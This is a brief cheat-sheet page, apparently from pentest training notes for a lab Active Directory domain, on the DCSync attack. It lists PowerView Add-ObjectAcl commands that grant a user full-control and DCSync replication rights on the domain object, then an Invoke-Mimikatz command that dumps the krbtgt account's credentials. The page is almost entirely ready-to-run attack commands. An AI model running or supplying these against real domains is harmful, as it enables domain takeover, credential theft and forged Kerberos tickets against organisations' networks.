# 2⃣ DCsync

### **Add full-control rights**

{% code overflow="wrap" %}
```
Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,DC=local’ -PrincipalSamAccountName <username> -Rights All -Verbose
```
{% endcode %}

### **Add rights for DCsync**

{% code overflow="wrap" %}
```
Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,Dc=local’ -PrincipalSamAccountName <username> -Rights DCSync -Verbose
```
{% endcode %}

### **Execute DCSync and dump krbtgt**

```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
```
